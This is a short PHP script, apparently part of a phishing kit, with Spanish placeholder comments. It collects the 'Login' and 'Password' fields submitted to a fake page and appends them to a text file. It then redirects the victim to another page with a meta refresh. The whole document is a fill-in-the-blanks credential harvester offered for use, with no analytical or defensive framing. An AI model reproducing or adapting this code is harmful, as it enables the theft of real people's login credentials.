<?php 
$login=$_POST["Login"]; 
$pass=$_POST["Password"]; 
$guardar=fopen("el nombre del txt que quieran.txt",a); 
fwrite($guardar," 
".$login." 
".$pass); 
fclose($guardar); 
echo "<META HTTP-EQUIV='refresh' CONTENT='1; url=http://el link de la pagina fake'>"; 
?>
